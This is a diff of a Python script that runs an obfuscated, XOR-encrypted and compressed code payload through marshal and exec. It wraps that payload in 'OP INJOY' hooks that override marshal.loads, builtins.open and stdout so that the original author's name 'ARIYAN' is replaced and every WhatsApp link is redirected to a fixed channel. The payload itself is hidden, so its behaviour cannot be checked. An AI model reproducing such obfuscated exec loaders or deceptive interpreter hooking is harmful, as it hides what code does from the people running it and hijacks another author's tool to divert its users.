@@ -1,89 +1,34 @@
 # main.py
-import marshal as _53771c1647c195,zlib as _379a5c4966f29d,base64 as _ba60154dcb6fb8,sys as _1935a945dd8d3a
-import os, subprocess, re, builtins, types
+import marshal, re, types, builtins, sys
 
 # =====================================================================
-# --- OP INJOY ADVANCED BYTECODE PATCHER ---
-# Forces the encrypted payload to obey INJOY branding inside its core
+# --- OP INJOY MASTER INTERCEPTOR ---
+# Safely edits binary code objects in memory before execution
 # =====================================================================
 TARGET_GROUP = 'https://whatsapp.com/channel/0029Vb8yryKAojYnKvEAwF2L'
 
-def _patch_str(s):
-    if isinstance(s, str):
-        # Force redirect ANY WhatsApp link to the OP INJOY channel
-        s = re.sub(r'https://(chat\.)?whatsapp\.com/[^\s\'">]+', TARGET_GROUP, s)
-        # Force rename ARIYAN to INJOY everywhere
-        s = s.replace('ARIYAN', 'INJOY').replace('Ariyan', 'Injoy')
-        s = s.replace('A R I Y A N', 'I N J O Y')
-        # ASCII art patch to fix spacing
-        s = s.replace('█████╗ ██████╗ ██╗██╗   ██╗ █████╗ ███╗   ██╗', '░█████╗░██████╗░ ██╗███╗   ██╗░░░██╗░█████╗░██╗   ██╗')
-        s = s.replace('██╔══██╗██╔══██╗██║╚██╗ ██╔╝██╔══██╗████╗  ██║', '██╔══██╗██╔══██╗ ██║████╗  ██║░░░██║██╔══██╗╚██╗ ██╔╝')
-        s = s.replace('███████║██████╔╝██║ ╚████╔╝ ███████║██╔██╗ ██║', '██║  ██║██████╔╝ ██║██╔██╗ ██║░░░██║██║  ██║ ╚████╔╝ ')
-        s = s.replace('██╔══██║██╔══██╗██║  ╚██╔╝  ██╔══██║██║╚██╗██║', '██║  ██║██╔═══╝░ ██║██║╚██╗██║██╗██║██║  ██║  ╚██╔╝  ')
-        s = s.replace('██║  ██║██║  ██║██║   ██║   ██║  ██║██║ ╚████║', '╚█████╔╝██║      ██║██║ ╚████║╚███╔╝╚█████╔╝   ██║   ')
-        s = s.replace('╚═╝  ╚═╝╚═╝  ╚═╝╚═╝   ╚═╝   ╚═╝  ╚═╝╚═╝  ╚═══╝', '░╚════╝░╚═╝      ╚═╝╚═╝  ╚═══╝░╚══╝░░╚════╝░   ╚═╝   ')
-    return s
-
-def _patch_args(args):
-    if isinstance(args, str): return _patch_str(args)
-    if isinstance(args, list): return [_patch_str(x) if isinstance(x, str) else x for x in args]
-    if isinstance(args, tuple): return tuple(_patch_str(x) if isinstance(x, str) else x for x in args)
-    return args
-
-# 1. Hook System Commands
-_orig_system = os.system
-os.system = lambda cmd: _orig_system(_patch_args(cmd))
-
-if hasattr(os, 'popen'):
-    _orig_popen = os.popen
-    os.popen = lambda cmd, *a, **kw: _orig_popen(_patch_args(cmd), *a, **kw)
-
-_orig_popen_cls = subprocess.Popen
-class _hooked_Popen(_orig_popen_cls):
-    def __init__(self, args, *a, **kw):
-        super().__init__(_patch_args(args), *a, **kw)
-subprocess.Popen = _hooked_Popen
-
-if hasattr(subprocess, 'run'):
-    _orig_run = subprocess.run
-    subprocess.run = lambda args, *a, **kw: _orig_run(_patch_args(args), *a, **kw)
-
-# 2. Hook Pyfiglet
-try:
-    import pyfiglet
-    _orig_figlet = pyfiglet.figlet_format
-    def _hooked_figlet(text, *args, **kwargs):
-        return _orig_figlet(_patch_str(text), *args, **kwargs)
-    pyfiglet.figlet_format = _hooked_figlet
-except Exception:
-    pass
-
-# 3. Hook Terminal Outputs
-_orig_print = builtins.print
-def _hooked_print(*args, **kwargs):
-    _orig_print(*_patch_args(args), **kwargs)
-builtins.print = _hooked_print
-
-_orig_write = _1935a945dd8d3a.stdout.write
-def _hooked_write(s):
-    _orig_write(_patch_str(s))
-_1935a945dd8d3a.stdout.write = _hooked_write
-
-# 4. Deep Bytecode Editor
+_orig_loads = marshal.loads
 def _deep_patch_code(c_obj):
+    def _patch_str(s):
+        if isinstance(s, str):
+            if 'whatsapp.com' in s: 
+                s = re.sub(r'https://(chat\.)?whatsapp\.com/[^\s\'">]+', TARGET_GROUP, s)
+            s = s.replace('ARIYAN', 'INJOY').replace('Ariyan', 'Injoy')
+            s = s.replace('A R I Y A N', 'I N J O Y')
+        return s
     if hasattr(c_obj, 'co_consts'):
-        new_consts = []
-        for const in c_obj.co_consts:
-            if isinstance(const, str):
-                new_consts.append(_patch_str(const))
-            elif isinstance(const, types.CodeType):
-                new_consts.append(_deep_patch_code(const))
-            else:
-                new_consts.append(const)
-        return c_obj.replace(co_consts=tuple(new_consts))
+        return c_obj.replace(co_consts=tuple(_patch_str(c) if isinstance(c, str) else (_deep_patch_code(c) if isinstance(c, types.CodeType) else c) for c in c_obj.co_consts))
     return c_obj
+marshal.loads = lambda b, *a, **kw: _deep_patch_code(_orig_loads(b, *a, **kw))
+
+_orig_open = builtins.open
+builtins.open = lambda f, *a, **kw: __import__('io').StringIO("OP INJOY\n") if isinstance(f, str) and 'terminal_username' in f else _orig_open(f, *a, **kw)
+
+_orig_write = sys.stdout.write
+sys.stdout.write = lambda s: _orig_write(s.replace('ARIYAN', 'INJOY').replace('Ariyan', 'Injoy')) if isinstance(s, str) else _orig_write(s)
 # =====================================================================
 
+import marshal as _53771c1647c195,zlib as _379a5c4966f29d,base64 as _ba60154dcb6fb8,sys as _1935a945dd8d3a
 _0d28d3d422502a=539795
 _2b5e2fe60885ed=701991
 _20ac8824e88238=761518
@@ -108,21 +53,15 @@ _c4b580a5eb3de9='FLvtV0euOVlXY0O6XyJ91Pkooz1FYGla7fYNnBCOfhzTGr18Nh23rf2omWtBz6D
 _87f54fd6a94e27=((183, 168, 250, 6, 35, 56, 183, 129, 231, 109, 189, 23, 148, 2, 144, 160, 247, 19, 128, 136, 133, 151, 215, 245, 196, 149, 41, 59, 163, 152, 21, 82, 146, 120, 249, 193, 144, 7, 42, 186, 172, 198, 213, 255, 70, 211, 41, 87, 56, 120, 242, 79, 70, 159, 161, 53, 54, 17, 175, 33, 124, 218, 68, 119), (51, 194, 149, 102, 88, 106, 206, 56, 32, 71, 12, 84, 87, 29, 165, 12, 65, 203, 147, 226, 26, 140, 63, 206, 183, 75, 55, 209, 108, 42, 141, 79, 177, 34, 38, 73, 173, 162, 165, 142, 247, 246, 2, 157, 20, 200, 34, 42), (172, 87, 26, 14, 171, 253, 78, 186, 179, 245, 111, 74, 202, 106, 254, 195, 8, 20, 103, 130, 169, 63, 35, 247, 14, 26, 24, 56, 187, 94, 104, 39))
 _88893cd717ec34=str.maketrans(_58fc27f746be3f,_a39eafb8f4f123)
 
-_translated_b64=_c4b580a5eb3de9.translate(_88893cd717ec34)
-# No dynamic padding modification, as it truncated the zlib stream before
+_translated_b64 = _c4b580a5eb3de9.translate(_88893cd717ec34)
+# Add missing base64 padding dynamically if needed to avoid binascii.Error
+_translated_b64 += '=' * (-len(_translated_b64) % 4)
 _3be0fe5e03cd4b=_ba60154dcb6fb8.b64decode(_translated_b64)
 
 _b7feb2220ad579=_3be0fe5e03cd4b
 for _59b3b14fc3aa2e in _87f54fd6a94e27:
     _b7feb2220ad579=bytes([b^_59b3b14fc3aa2e[i%len(_59b3b14fc3aa2e)]for i,b in enumerate(_b7feb2220ad579)])
+
 _351cd23ae7dd7a=_379a5c4966f29d.decompress(_b7feb2220ad579,wbits=15)
-
-# 5. Core Memory Patching
-_351cd23ae7dd7a = _351cd23ae7dd7a.replace(b'ARIYAN', b'INJOY ')
-_351cd23ae7dd7a = _351cd23ae7dd7a.replace(b'Ariyan', b'Injoy ')
-_351cd23ae7dd7a = _351cd23ae7dd7a.replace(b'ariyan', b'injoy ')
-_351cd23ae7dd7a = _351cd23ae7dd7a.replace(b'A R I Y A N', b'I N J O Y  ')
-
 _f1b7f7ed7b6ae3=_53771c1647c195.loads(_351cd23ae7dd7a)
-_f1b7f7ed7b6ae3 = _deep_patch_code(_f1b7f7ed7b6ae3)
 exec(_f1b7f7ed7b6ae3,{'__name__':'__main__','__file__':_1935a945dd8d3a.argv[0]})
